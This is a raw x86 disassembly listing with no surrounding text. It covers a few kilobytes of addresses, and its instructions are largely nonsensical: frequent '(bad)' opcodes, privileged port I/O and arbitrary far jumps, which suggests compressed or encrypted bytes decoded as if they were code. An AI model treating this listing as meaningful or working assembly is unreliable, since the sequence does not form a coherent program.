  418bd5:	mov    eax,ds:0x5f3432ac
  418bda:	popf   
  418bdb:	jl     0x418b90
  418bdd:	sahf   
  418bde:	sbb    DWORD PTR [esi],esp
  418be0:	(bad)  
  418be2:	out    dx,al
  418be3:	xchg   ebx,eax
  418be4:	clc    
  418be5:	mov    ch,0xb5
  418be7:	adc    ch,ch
  418be9:	jp     0x418b7a
  418beb:	cmp    DWORD PTR [edi],esp
  418bed:	inc    edx
  418bee:	or     bl,bh
  418bf0:	shr    BYTE PTR ds:0xfed660e6,1
  418bf6:	gs dec edx
  418bf8:	inc    BYTE PTR [ecx+0x1b3cbfbc]
  418bfe:	jo     0x418c29
  418c00:	sub    BYTE PTR [ebx+0x5108e733],ch
  418c06:	pop    edx
  418c07:	fcom   DWORD PTR ds:0x68539844
  418c0d:	push   0xa1b3e6f1
  418c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c13:	dec    ebx
  418c14:	sti    
  418c15:	leave  
  418c16:	push   0xffffff92
  418c18:	or     al,0xce
  418c1a:	add    cl,BYTE PTR [edi]
  418c1c:	add    ah,BYTE PTR [edx-0x66]
  418c1f:	rcl    DWORD PTR [eax],cl
  418c21:	leave  
  418c22:	inc    ebp
  418c23:	out    0x78,al
  418c25:	xchg   ecx,eax
  418c26:	mov    WORD PTR [esi+ebx*8-0x37],es
  418c2a:	aas    
  418c2b:	ds sub eax,ebp
  418c2e:	mov    ebx,0xe3d3e486
  418c33:	cmp    dh,BYTE PTR [eax+0x4632868a]
  418c39:	iret   
  418c3a:	mov    ecx,DWORD PTR [ecx+0x1c6aba2d]
  418c40:	ss jecxz 0x418c3d
  418c43:	push   es
  418c44:	cmp    DWORD PTR [ebx-0x297aafc1],eax
  418c4a:	adc    edx,DWORD PTR [edi+0x54]
  418c4d:	push   ebp
  418c4e:	dec    eax
  418c4f:	jecxz  0x418c2a
  418c51:	pop    esp
  418c52:	aad    0xad
  418c54:	repnz and DWORD PTR [ecx-0x176bd7d9],edi
  418c5b:	es push es
  418c5d:	inc    eax
  418c5e:	ds movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  418c61:	lods   eax,DWORD PTR ds:[esi]
  418c62:	jmp    0x7c22:0xc0c4b90f
  418c69:	adc    DWORD PTR [eax],ebx
  418c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c6c:	add    bh,bl
  418c6e:	pop    eax
  418c6f:	fbstp  TBYTE PTR [esp+ecx*4-0x4]
  418c73:	setno  BYTE PTR [esi+0x41]
  418c77:	jno    0x418c1a
  418c79:	dec    esi
  418c7a:	fs xchg esp,eax
  418c7c:	sbb    dl,BYTE PTR [edx]
  418c7e:	push   ds
  418c7f:	or     eax,0xf350fa3d
  418c84:	sti    
  418c85:	lds    ebx,FWORD PTR [esi+0x46]
  418c88:	jge    0x418c22
  418c8a:	and    ebx,ecx
  418c8c:	shl    edx,1
  418c8e:	lds    ecx,FWORD PTR [edi+0x6e45ef3c]
  418c94:	cmp    cl,cl
  418c96:	push   ebx
  418c97:	mov    eax,ds:0xc7b50a08
  418c9c:	retf   0x8eeb
  418c9f:	push   ss
  418ca0:	popf   
  418ca1:	test   eax,0x8b1f938b
  418ca6:	mov    eax,0x1af2d51
  418cab:	cld    
  418cac:	jle    0x418cd0
  418cae:	xchg   esp,eax
  418caf:	(bad)  
  418cb0:	cmp    al,0x86
  418cb2:	(bad)  
  418cb3:	push   0x7a6458c7
  418cb8:	rol    DWORD PTR [edx-0x4d20bfd9],cl
  418cbe:	sbb    esi,eax
  418cc0:	mov    BYTE PTR [edx],ah
  418cc2:	stos   DWORD PTR es:[edi],eax
  418cc3:	adc    DWORD PTR [eax],0xd2edf2f4
  418cc9:	xchg   edx,eax
  418cca:	sub    ebx,DWORD PTR [ebx+0x77c7c2a2]
  418cd0:	inc    edi
  418cd1:	adc    dl,ah
  418cd3:	ins    BYTE PTR es:[edi],dx
  418cd4:	sbb    eax,0x15f74b37
  418cd9:	loopne 0x418cb6
  418cdb:	or     BYTE PTR [eax+0x619df731],0xfe
  418ce2:	mov    dl,0x91
  418ce4:	push   esp
  418ce5:	inc    ecx
  418ce6:	outs   dx,BYTE PTR ds:[esi]
  418ce7:	aad    0x4
  418ce9:	adc    BYTE PTR [ecx],0x2a
  418cec:	repnz xchg edx,eax
  418cee:	push   edx
  418cef:	pop    edi
  418cf0:	xor    ebx,esi
  418cf2:	cwde   
  418cf3:	mov    eax,0xe218f5f2
  418cf8:	fst    QWORD PTR [ebx-0x3e]
  418cfb:	retf   
  418cfc:	loope  0x418cf2
  418cfe:	pop    ds
  418cff:	push   ebx
  418d00:	imul   esi,DWORD PTR [edi-0x4a2956df],0xe7e38853
  418d0a:	jns    0x418d01
  418d0c:	pop    eax
  418d0d:	inc    edx
  418d0e:	dec    edx
  418d0f:	les    edi,FWORD PTR [esi]
  418d11:	adc    edi,DWORD PTR [edi]
  418d13:	cmp    BYTE PTR [ecx+0x7e],ah
  418d16:	xor    bh,BYTE PTR [ebx-0x6a]
  418d19:	cmp    al,ch
  418d1b:	inc    DWORD PTR [ebp+0x71]
  418d1e:	das    
  418d1f:	imul   esp,DWORD PTR [edx-0x4b4ec287],0xecd059f4
  418d29:	adc    al,0x34
  418d2b:	(bad)  
  418d2c:	push   0xfffffff0
  418d2e:	push   0x329febf1
  418d33:	std    
  418d34:	cmc    
  418d35:	sub    ebp,ecx
  418d37:	imul   eax,DWORD PTR ds:0x62771b24,0xfffffff1
  418d3e:	(bad)  
  418d3f:	mov    esi,0x83825a11
  418d44:	inc    esi
  418d45:	shl    DWORD PTR ds:0x8d2d013a,1
  418d4b:	or     DWORD PTR [esi+ebx*8-0x48bcc5dd],ebx
  418d52:	and    eax,0x52d2d82f
  418d57:	xor    DWORD PTR [esi+0xa],edi
  418d5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d5b:	icebp  
  418d5c:	sub    BYTE PTR [ecx-0x18],dh
  418d5f:	push   ecx
  418d60:	test   BYTE PTR [ebx-0x1f2479c8],dl
  418d66:	loopne 0x418d82
  418d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d69:	js     0x418cee
  418d6b:	loopne 0x418d86
  418d6d:	and    ah,al
  418d6f:	cmp    al,0xbc
  418d71:	(bad)  
  418d72:	dec    edi
  418d73:	imul   esp,DWORD PTR [edi-0x31f2c0c3],0xffffffc2
  418d7a:	popf   
  418d7b:	aas    
  418d7c:	mov    ebx,0x77476db7
  418d81:	pop    edi
  418d82:	xor    DWORD PTR ds:0xd4ae4dd2,ecx
  418d88:	dec    ebx
  418d89:	ret    
  418d8a:	push   ss
  418d8b:	and    BYTE PTR [ebx+0x7a],al
  418d8e:	pop    es
  418d8f:	jnp    0x418dc8
  418d91:	int3   
  418d92:	xchg   ecx,eax
  418d93:	ffree  st(4)
  418d95:	jmp    0xe293c66d
  418d9a:	ret    0x6cd7
  418d9d:	out    0xbc,al
  418d9f:	mov    dh,0x1f
  418da1:	es jae 0x418d2f
  418da4:	ror    DWORD PTR [di-0x25],0x4f
  418da9:	pop    es
  418daa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dab:	bnd jnp 0x418dee
  418dae:	les    esi,FWORD PTR [eax]
  418db0:	in     eax,dx
  418db1:	mov    eax,0xef934333
  418db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418db7:	iret   
  418db8:	aam    0x7
  418dba:	imul   esi,DWORD PTR [ecx+eiz*2+0x2bdaf38b],0x8ed5d7b3
  418dc5:	mov    ecx,0x1b72387a
  418dca:	xchg   ebx,eax
  418dcb:	les    edx,FWORD PTR [edx+0x7d]
  418dce:	lock push es
  418dd0:	pop    esp
  418dd1:	scas   eax,DWORD PTR es:[edi]
  418dd2:	dec    edi
  418dd3:	lods   eax,DWORD PTR ds:[esi]
  418dd4:	aas    
  418dd5:	call   0xf954:0x1632cecc
  418ddc:	loopne 0x418dfd
  418dde:	ss (bad) 
  418de0:	hlt    
  418de1:	iret   
  418de2:	cmp    al,0x3b
  418de4:	mov    edi,0xa94cdb2d
  418de9:	pop    ds
  418dea:	loope  0x418e68
  418dec:	in     al,dx
  418ded:	mov    al,0xcc
  418def:	and    al,BYTE PTR [edx+0x54]
  418df2:	inc    ebp
  418df3:	cmp    BYTE PTR [eax-0x17],cl
  418df6:	(bad)  [esi-0x17f49df5]
  418dfc:	lock mov esi,0x4f6a8434
  418e02:	mov    bh,0x16
  418e04:	mov    ebp,0x377816f3
  418e09:	ffreep st(4)
  418e0b:	dec    esi
  418e0c:	in     eax,dx
  418e0d:	xor    eax,0xf34d8f5a
  418e12:	adc    esp,eax
  418e14:	add    al,0x6c
  418e16:	push   ecx
  418e17:	nop
  418e18:	mov    ?,WORD PTR [esi]
  418e1a:	out    dx,eax
  418e1b:	aas    
  418e1c:	jnp    0x418e64
  418e1e:	out    0xa7,eax
  418e20:	pop    ebx
  418e21:	shr    DWORD PTR [ecx+0x573b2d5c],0xbe
  418e28:	ss jmp 0xa67f0440
  418e2e:	sbb    DWORD PTR [esi+0x130d3362],edx
  418e34:	fadd   DWORD PTR [esi+0x29c7e943]
  418e3a:	das    
  418e3b:	inc    edi
  418e3c:	add    ah,bh
  418e3e:	or     eax,0x9f6e046f
  418e43:	dec    edx
  418e44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e45:	sbb    eax,0x88f79f0b
  418e4a:	adc    dl,BYTE PTR [ebx]
  418e4c:	xchg   DWORD PTR [edi-0x55955ce9],edx
  418e52:	mov    al,0x71
  418e54:	and    BYTE PTR [ecx-0x20575ed9],dl
  418e5a:	outs   dx,BYTE PTR ds:[esi]
  418e5b:	mov    eax,0x1946246d
  418e60:	cmc    
  418e61:	lods   eax,DWORD PTR ds:[esi]
  418e62:	out    0x2b,al
  418e64:	shl    DWORD PTR [ebp+0x4f43562a],cl
  418e6a:	and    dl,dh
  418e6c:	sub    edi,DWORD PTR [ebp+0x36]
  418e6f:	or     eax,0xe96e3f47
  418e74:	dec    esp
  418e75:	mov    ds:0x4dc473d2,al
  418e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e7b:	repnz shr edi,cl
  418e7e:	inc    ebp
  418e7f:	sub    DWORD PTR [ecx],ebx
  418e81:	sub    BYTE PTR [esi],dh
  418e83:	scas   eax,DWORD PTR es:[edi]
  418e84:	push   ss
  418e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e86:	xchg   ebx,eax
  418e87:	rcr    dl,cl
  418e89:	stos   BYTE PTR es:[edi],al
  418e8a:	(bad)  
  418e8b:	jmp    0x1973a2f3
  418e90:	add    DWORD PTR [edx-0x4e9e0b6d],eax
  418e96:	push   ss
  418e97:	shr    DWORD PTR [ebp+0xcfea89d],cl
  418e9d:	pop    eax
  418e9e:	in     eax,dx
  418e9f:	mov    bh,0xd0
  418ea1:	iret   
  418ea2:	out    0xad,eax
  418ea4:	sub    DWORD PTR [ecx-0x75],ebx
  418ea7:	inc    eax
  418ea8:	out    dx,al
  418ea9:	repnz pop esi
  418eab:	jle    0x418f0d
  418ead:	cmp    esi,edx
  418eaf:	dec    eax
  418eb0:	ja     0x418efc
  418eb2:	push   ss
  418eb3:	jnp    0x418f00
  418eb5:	mov    cs,WORD PTR [esi]
  418eb7:	xchg   edx,eax
  418eb8:	pop    ecx
  418eb9:	outs   dx,DWORD PTR ds:[esi]
  418eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ebb:	mov    bh,0x2e
  418ebd:	out    dx,al
  418ebe:	clc    
  418ebf:	jl     0x418e8d
  418ec1:	inc    esi
  418ec2:	or     eax,0x833d7df1
  418ec7:	and    BYTE PTR [ebx-0x3ab4894e],al
  418ecd:	xchg   ecx,eax
  418ece:	sub    eax,0xb5a8fb98
  418ed3:	inc    ecx
  418ed4:	retf   0xc3d9
  418ed7:	iret   
  418ed8:	mov    edi,0xf1daa5d3
  418edd:	push   ds
  418ede:	test   dh,bh
  418ee0:	outs   dx,BYTE PTR ds:[esi]
  418ee1:	call   0x1094:0x92fec356
  418ee8:	retf   
  418ee9:	jmp    0x4021616a
  418eee:	push   esi
  418eef:	cmp    eax,0xf4af01c0
  418ef4:	aad    0x57
  418ef6:	ins    DWORD PTR es:[edi],dx
  418ef7:	jb     0x418f36
  418ef9:	adc    DWORD PTR [esi-0x60],eax
  418efc:	sub    al,0xa6
  418efe:	push   esi
  418eff:	add    ah,BYTE PTR [ebx]
  418f01:	adc    ch,bl
  418f03:	popa   
  418f04:	mov    al,0x29
  418f06:	add    DWORD PTR [edi+eiz*8+0x77d62ef2],ebx
  418f0d:	in     eax,0xdc
  418f0f:	or     al,0xb3
  418f11:	dec    esi
  418f12:	dec    eax
  418f13:	leave  
  418f14:	xlat   BYTE PTR ds:[ebx]
  418f15:	sub    dl,BYTE PTR [esi]
  418f17:	add    al,0x2d
  418f19:	mov    eax,0xb19a0973
  418f1e:	stos   DWORD PTR es:[edi],eax
  418f1f:	fdivr  QWORD PTR [eax]
  418f21:	add    eax,edx
  418f23:	addr16 mov ebx,0x21257992
  418f29:	int3   
  418f2a:	mov    eax,ss
  418f2c:	push   ebp
  418f2d:	push   ss
  418f2e:	push   ds
  418f2f:	je     0x418f4a
  418f31:	loop   0x418f96
  418f33:	sbb    BYTE PTR [edi+eax*1+0x38f3b5c3],al
  418f3a:	mov    eax,ds:0x4d3e0fb6
  418f3f:	cmp    ah,BYTE PTR [esi-0x78]
  418f42:	mov    edi,0xc342e237
  418f47:	adc    ecx,DWORD PTR [edx+0x53]
  418f4a:	hlt    
  418f4b:	xchg   esp,eax
  418f4c:	inc    eax
  418f4d:	pop    ds
  418f4e:	repnz sbb eax,0xb549a1d8
  418f54:	pop    eax
  418f55:	sub    al,0xa
  418f57:	xor    al,0x54
  418f59:	pop    edx
  418f5a:	cmp    BYTE PTR [edx+0x2300426f],bh
  418f60:	fwait
  418f61:	lods   al,BYTE PTR ds:[esi]
  418f62:	das    
  418f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f64:	push   0x4a
  418f66:	push   ss
  418f67:	sub    ecx,DWORD PTR cs:[edx]
  418f6a:	and    esp,DWORD PTR [ecx+0x13]
  418f6d:	ins    BYTE PTR es:[edi],dx
  418f6e:	sti    
  418f6f:	sub    BYTE PTR [ebp+ebp*1-0x52bb40bc],dl
  418f76:	loopne 0x418f65
  418f78:	aam    0x42
  418f7a:	fnstcw WORD PTR [edx-0x29]
  418f7d:	cmp    dl,bl
  418f7f:	pop    ebx
  418f80:	mov    ebp,0x9fe99012
  418f85:	dec    ebp
  418f86:	data16 mov al,ds:0xaccef194
  418f8c:	mov    edi,0x47c45bba
  418f91:	mov    ebp,0x6fd30789
  418f96:	jae    0x418ff7
  418f98:	mov    ds:0xffbb6132,eax
  418f9d:	leave  
  418f9e:	inc    esi
  418f9f:	mov    bl,0x2
  418fa1:	or     DWORD PTR [ecx],ebp
  418fa3:	mov    cl,0x2a
  418fa5:	inc    edi
  418fa6:	fwait
  418fa7:	mov    edi,0xa5bcb994
  418fac:	(bad)  
  418fad:	(bad)  
  418fae:	(bad)  [esi-0x4d03bc2c]
  418fb4:	cmp    DWORD PTR [eax-0x1e0a7155],edi
  418fba:	mov    bl,0xe5
  418fbc:	xchg   BYTE PTR [ebp-0x66],bh
  418fbf:	xchg   ebx,eax
  418fc0:	mov    dl,0x4
  418fc2:	sar    DWORD PTR [ecx-0x1e793cd2],0xac
  418fc9:	add    cl,BYTE PTR [ebx-0xe8a3a81]
  418fcf:	sbb    al,0x54
  418fd1:	jl     0x418f80
  418fd3:	rol    dl,cl
  418fd5:	adc    al,0x5a
  418fd7:	(bad)
  418fdb:	js     0x418f65
  418fdd:	mov    cl,BYTE PTR [eax-0x6eb3609e]
  418fe3:	xor    ah,BYTE PTR [ecx]
  418fe5:	and    al,0x7b
  418fe7:	xchg   DWORD PTR [esi],ebp
  418fe9:	lea    edi,[edi-0x3e]
  418fec:	pop    ss
  418fed:	lock out dx,al
  418fef:	push   eax
  418ff0:	fnsave [edi-0x4f772e3d]
  418ff6:	repz pop ds
  418ff8:	sbb    al,0x7d
  418ffa:	pusha  
  418ffb:	add    DWORD PTR [edi+edi*2+0x2b],edx
  418fff:	fstp   st(4)
  419001:	and    dl,BYTE PTR [eax+0x49]
  419004:	cld    
  419005:	vandpd ymm4,ymm5,YMMWORD PTR [ebx-0x3d]
  41900a:	mov    esi,0x4889bda1
  41900f:	(bad)
  419012:	mov    al,ds:0xbdac44a6
  419017:	cld    
  419018:	mov    WORD PTR [eax],fs
  41901a:	lods   al,BYTE PTR ds:[esi]
  41901b:	push   ebx
  41901c:	stos   BYTE PTR es:[edi],al
  41901d:	les    ecx,FWORD PTR [ebp+0x5d60623c]
  419023:	test   al,0x12
  419025:	mov    bl,BYTE PTR [eax]
  419027:	cld    
  419028:	xor    DWORD PTR [esi+0x25],ecx
  41902b:	sub    al,0x80
  41902d:	dec    esp
  41902e:	mov    ecx,0xc0bdc974
  419033:	(bad)  
  419034:	loope  0x419044
  419036:	fs mov ebp,0x517938b1
  41903c:	pushf  
  41903d:	mov    dh,0x63
  41903f:	mov    ebx,0xc363a5eb
  419045:	inc    esi
  419046:	jmp    0x41901e
  419048:	or     ch,bh
  41904a:	inc    ecx
  41904b:	xchg   esp,eax
  41904c:	dec    eax
  41904d:	sbb    eax,0xc626725
  419052:	pop    ds
  419053:	push   esi
  419054:	jo     0x419018
  419056:	push   ebx
  419057:	mov    esi,0x19c2a1e2
  41905c:	xor    ebp,DWORD PTR ds:0x2bee2c49
  419062:	retf   
  419063:	add    bl,al
  419065:	mov    bl,0xda
  419067:	and    BYTE PTR [ebp-0x3a],cl
  41906a:	aaa    
  41906b:	sti    
  41906c:	inc    eax
  41906d:	test   DWORD PTR [ebp+0x70],ecx
  419070:	retf   0x3a64
  419073:	ret    0x1b7
  419076:	(bad)  
  419077:	mov    ebx,esp
  419079:	inc    eax
  41907a:	and    ah,dl
  41907c:	fcmove st,st(7)
  41907e:	pop    es
  41907f:	sub    DWORD PTR [edi+0x40],ecx
  419082:	mov    bh,0x76
  419084:	xchg   DWORD PTR [ebx],edx
  419086:	push   ds
  419087:	mov    esp,0xd1828366
  41908c:	and    DWORD PTR [eax-0x77ab598c],ebx
  419092:	fs jp  0x41902c
  419095:	pop    ss
  419096:	fcomi  st,st(4)
  419098:	jg     0x4190c0
  41909a:	mov    cl,0xa2
  41909c:	mov    edi,0x48d02da3
  4190a1:	test   eax,0x7697790e
  4190a6:	mov    edx,0xf7ec8796
  4190ab:	jl     0x4190df
  4190ad:	hlt    
  4190ae:	mov    eax,ds:0xee9c1316
  4190b3:	std    
  4190b4:	push   edi
  4190b5:	shr    dl,1
  4190b7:	test   dl,0x66
  4190ba:	add    al,ah
  4190bc:	push   esp
  4190bd:	sub    edi,ebx
  4190bf:	mov    ch,0xfc
  4190c1:	rcr    DWORD PTR [edx+eax*1-0x47],0x48
  4190c6:	fcmove st,st(0)
  4190c8:	push   es
  4190c9:	test   esi,esi
  4190cb:	adc    BYTE PTR [eax+0x79],ah
  4190ce:	in     eax,dx
  4190cf:	cwde   
  4190d0:	and    BYTE PTR [edx-0x31],0x91
  4190d4:	(bad)  
  4190d5:	out    0x12,eax
  4190d7:	mov    edi,0x8ae4a048
  4190dc:	ror    BYTE PTR [edi+esi*2],1
  4190df:	outs   dx,DWORD PTR ds:[esi]
  4190e0:	jmp    0x6ed59336
  4190e5:	jne    0x419077
  4190e7:	adc    al,0xa1
  4190e9:	cwde   
  4190ea:	mov    edi,0xdedca95d
  4190ef:	jl     0x41914b
  4190f1:	and    DWORD PTR ds:0x89807553,esp
  4190f7:	push   ecx
  4190f8:	xor    dh,BYTE PTR [ebx]
  4190fa:	inc    esp
  4190fb:	retf   
  4190fc:	fidiv  DWORD PTR [eax-0x6f6b5687]
  419102:	and    DWORD PTR [eax+0x35],0xb99c7cea
  419109:	ret    
  41910a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41910b:	(bad)  
  41910c:	fsubp  st(6),st
  41910e:	ror    DWORD PTR [edi+0x54f828f4],1
  419114:	rcl    BYTE PTR [ebp-0x4261e54e],cl
  41911a:	dec    esi
  41911b:	dec    ecx
  41911c:	sub    esi,0x79351548
  419122:	in     al,0x96
  419124:	fxch   st(1)
  419126:	xor    BYTE PTR [ebp+0x6ca58a94],dh
  41912c:	loope  0x419144
  41912e:	mov    edx,DWORD PTR [esi+edx*2]
  419131:	test   BYTE PTR [edx-0x29],cl
  419134:	popf   
  419135:	inc    ebp
  419136:	sbb    ah,BYTE PTR [eax]
  419138:	das    
  419139:	dec    eax
  41913a:	out    0xf3,al
  41913c:	pop    ss
  41913d:	dec    esp
  41913e:	jecxz  0x419196
  419140:	jbe    0x4191b1
  419142:	pop    edi
  419143:	pop    ebx
  419144:	test   esi,0x1f07913e
  41914a:	push   ebx
  41914b:	addr16 pop es
  41914d:	dec    edx
  41914e:	popa   
  41914f:	jb     0x419167
  419151:	inc    ebp
  419152:	xchg   BYTE PTR [ebx+0x76073120],cl
  419158:	push   ebp
  419159:	adc    DWORD PTR [ebx-0x11c77a39],edi
  41915f:	sbb    eax,0x957fc1e8
  419164:	inc    edi
  419165:	adc    BYTE PTR [edi],ch
  419167:	sahf   
  419168:	fucomip st,st(6)
  41916a:	add    DWORD PTR [edx],edx
  41916c:	add    al,al
  41916e:	xor    eax,edi
  419170:	ftst   
  419172:	cmp    edi,ecx
  419174:	addr16 inc edx
  419176:	int3   
  419177:	and    ch,BYTE PTR [edi+0x720a8a30]
  41917d:	shl    edx,cl
  41917f:	stos   BYTE PTR es:[edi],al
  419180:	jae    0x41912e
  419182:	into   
  419183:	dec    edx
  419184:	lods   eax,DWORD PTR ds:[esi]
  419185:	mov    esp,0x40b11b3c
  41918a:	mov    BYTE PTR [ebx+edx*4+0x32c62296],dl
  419191:	outs   dx,BYTE PTR ds:[esi]
  419192:	jmp    0x419185
  419194:	add    bl,cl
  419196:	dec    eax
  419197:	stos   BYTE PTR es:[edi],al
  419198:	shrd   ecx,ecx,0x4e
  41919c:	adc    ch,bh
  41919e:	pop    esp
  41919f:	gs es out 0xea,eax
  4191a3:	arpl   WORD PTR [eax+eiz*1-0x49],di
  4191a7:	inc    esi
  4191a8:	cld    
  4191a9:	jnp    0x419203
  4191ab:	jne    0x419193
  4191ad:	(bad)  
  4191ae:	(bad)  
  4191b0:	xchg   ebx,eax
  4191b1:	jae    0x4191cf
  4191b3:	dec    esi
  4191b4:	and    al,0x65
  4191b6:	mov    DWORD PTR [ebx-0x48],esi
  4191b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191ba:	mov    ecx,0x275e0b39
  4191bf:	push   eax
  4191c0:	pop    esi
  4191c1:	cmp    edx,ecx
  4191c3:	cmp    esi,ebx
  4191c5:	ja     0x419162
  4191c7:	push   ss
  4191c8:	cmp    al,0xd3
  4191ca:	mov    dh,0x7c
  4191cc:	cmp    BYTE PTR [eax],dl
  4191ce:	sbb    BYTE PTR [ecx+ecx*8],0x62
  4191d2:	dec    ecx
  4191d3:	loop   0x419156
  4191d5:	xor    al,0xe6
  4191d7:	(bad)  
  4191d8:	std    
  4191d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191da:	shl    dl,1
  4191dc:	icebp  
  4191dd:	and    al,0xa1
  4191df:	enter  0xd4bb,0x8a
  4191e3:	cmp    al,0x38
  4191e5:	cmp    ah,cl
  4191e7:	je     0x419188
  4191e9:	rol    BYTE PTR [edi-0x33ad7031],0x2b
  4191f0:	shl    BYTE PTR [eax+eax*8],0xb0
  4191f4:	inc    DWORD PTR [edx+0x69b11434]
  4191fa:	dec    edx
  4191fb:	fwait
  4191fc:	mov    ebp,0x46588c27
  419201:	fist   WORD PTR [esi]
  419203:	mov    es,di
  419206:	test   BYTE PTR [ebp+0x35],dl
  419209:	call   0xa75c:0x5491eaff
  419210:	add    al,0x1b
  419212:	adc    ah,bh
  419214:	xchg   edx,eax
  419215:	imul   ebx,esp,0x796c3dc6
  41921b:	cli    
  41921c:	dec    esp
  41921d:	dec    edx
  41921e:	ins    BYTE PTR es:[edi],dx
  41921f:	adc    eax,0x31c8db1e
  419224:	ret    0xd9e9
  419227:	cld    
  419228:	or     DWORD PTR [eax+0x18325de7],0xffffffcf
  41922f:	or     eax,0xb7d64a6a
  419234:	nop
  419235:	daa    
  419236:	inc    esi
  419237:	mov    eax,0x66e3b785
  41923c:	leave  
  41923d:	pop    edi
  41923e:	out    0x3a,eax
  419240:	in     eax,dx
  419241:	call   0x2e97d8b8
  419246:	aaa    
  419247:	push   0xe
  419249:	clc    
  41924a:	dec    esp
  41924b:	pop    esp
  41924c:	or     edi,ebp
  41924e:	adc    DWORD PTR [edi+0x4f205c27],0x12
  419255:	inc    eax
  419256:	cwde   
  419257:	fwait
  419258:	mov    BYTE PTR [eax],bl
  41925a:	loope  0x4192c7
  41925c:	push   edx
  41925d:	and    al,0xfa
  41925f:	lock push ss
  419261:	sbb    edi,DWORD PTR [edx]
  419263:	xor    al,BYTE PTR [esi]
  419265:	daa    
  419266:	mov    BYTE PTR [esi-0x1f],al
  419269:	rcr    BYTE PTR [eax+ebp*1],0xa7
  41926d:	loopne 0x41928c
  41926f:	in     eax,dx
  419270:	sub    dl,BYTE PTR [ebx+0x28]
  419273:	dec    edx
  419274:	xchg   dl,cl
  419276:	and    BYTE PTR [edx-0xc],dl
  419279:	jbe    0x4192a9
  41927b:	dec    edx
  41927c:	mov    ebp,0x49adc6e2
  419281:	out    0x88,al
  419283:	retf   
  419284:	cmp    cl,0xe7
  419287:	dec    ecx
  419288:	and    edi,DWORD PTR [ebp-0x1]
  41928b:	pop    ebx
  41928c:	test   eax,0xae297979
  419291:	mov    dh,0x20
  419293:	in     eax,0xd3
  419295:	fsubr  DWORD PTR [eax+ebp*2-0x5e952c5d]
  41929c:	ins    DWORD PTR es:[edi],dx
  41929d:	inc    ecx
  41929e:	xor    DWORD PTR [esi-0x62940aad],edx
  4192a4:	arpl   cx,si
  4192a6:	test   al,0xd6
  4192a8:	nop
  4192a9:	(bad)  
  4192aa:	xor    al,0x8e
  4192ac:	xchg   DWORD PTR [ebx+0x16ae7bd0],ebx
  4192b2:	(bad)  
  4192b3:	or     BYTE PTR [edx-0x31e0e56c],dh
  4192b9:	int3   
  4192ba:	pop    eax
  4192bb:	push   edi
  4192bc:	fnsave [edi+eax*4+0x5]
  4192c0:	arpl   WORD PTR [eax+0x7cda4b31],si
  4192c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192c7:	adc    BYTE PTR [eax],dh
  4192c9:	jbe    0x4192a6
  4192cb:	mov    al,ds:0xf451a560
  4192d0:	xor    dl,cl
  4192d2:	in     al,dx
  4192d3:	add    esi,DWORD PTR [ecx]
  4192d5:	adc    al,dh
  4192d7:	aam    0x4b
  4192d9:	sahf   
  4192da:	push   ds
  4192db:	jbe    0x419261
  4192dd:	in     eax,dx
  4192de:	inc    eax
  4192df:	dec    ecx
  4192e0:	mov    ds:0xc44f2561,al
  4192e5:	cmp    al,0x33
  4192e7:	(bad)  
  4192e8:	clc    
  4192e9:	adc    edi,DWORD PTR [ebx+0x348945ce]
  4192ef:	or     ebx,DWORD PTR [ebp-0x2]
  4192f2:	ja     0x4192c9
  4192f4:	ja     0x419295
  4192f6:	push   esp
  4192f7:	mov    WORD PTR [ebp+0x315c331],cs
  4192fd:	and    BYTE PTR [edx-0x5f126b4e],dl
  419303:	popf   
  419304:	mov    edx,0xfef53386
  419309:	ss xchg si,ax
  41930c:	push   edx
  41930d:	and    eax,0x7c9391e7
  419312:	(bad)  
  419313:	xchg   edi,eax
  419314:	test   BYTE PTR [edx+eiz*8],cl
  419317:	fidivr DWORD PTR [edi+0x7b]
  41931a:	pop    ecx
  41931b:	test   BYTE PTR [esi],cl
  41931d:	dec    edi
  41931e:	(bad)  
  41931f:	leave  
  419320:	hlt    
  419321:	pop    ss
  419322:	and    al,0x96
  419324:	loop   0x419331
  419326:	stc    
  419327:	shl    BYTE PTR [esi-0x45134610],cl
  41932d:	or     DWORD PTR [ecx+0x908b19b],ecx
  419333:	hlt    
  419334:	mov    cl,0xe6
  419336:	or     DWORD PTR [edi],edx
  419338:	sbb    ch,dl
  41933a:	in     eax,0x19
  41933c:	shl    DWORD PTR [edx-0x35],1
  41933f:	pop    es
  419340:	push   es
  419341:	repz mov ch,ch
  419344:	mov    ds:0x66c1c37a,eax
  419349:	lods   eax,DWORD PTR ds:[esi]
  41934a:	xchg   BYTE PTR [ebx-0x3e95aaa9],cl
  419350:	gs pop ecx
  419352:	pop    ds
  419353:	icebp  
  419354:	xchg   edi,eax
  419355:	or     al,0xb
  419357:	sub    al,0x13
  419359:	mov    edi,0x9d54adef
  41935e:	dec    esi
  41935f:	push   0xaffc2210
  419364:	cmp    al,0xf2
  419366:	repnz sbb BYTE PTR [esi+0x55],cl
  41936a:	jle    0x419389
  41936c:	daa    
  41936d:	ret    0x41d2
  419370:	shl    DWORD PTR [edi+0x44d78eef],cl
  419376:	(bad)  
  419377:	daa    
  419378:	xor    DWORD PTR [edx],ebp
  41937a:	cmp    DWORD PTR [edi+0x343eccd4],edx
  419380:	mov    ah,0x55
  419382:	sar    DWORD PTR [ecx-0x2c],1
  419385:	cmp    dl,BYTE PTR [eax]
  419387:	push   ebx
  419388:	ins    DWORD PTR es:[edi],dx
  419389:	mov    edi,0x1bd768e6
  41938e:	(bad)  
  41938f:	adc    al,0x57
  419391:	lea    esp,[ecx+0x75bd82c8]
  419397:	push   esp
  419398:	shr    BYTE PTR [esi+0x1f62de9c],cl
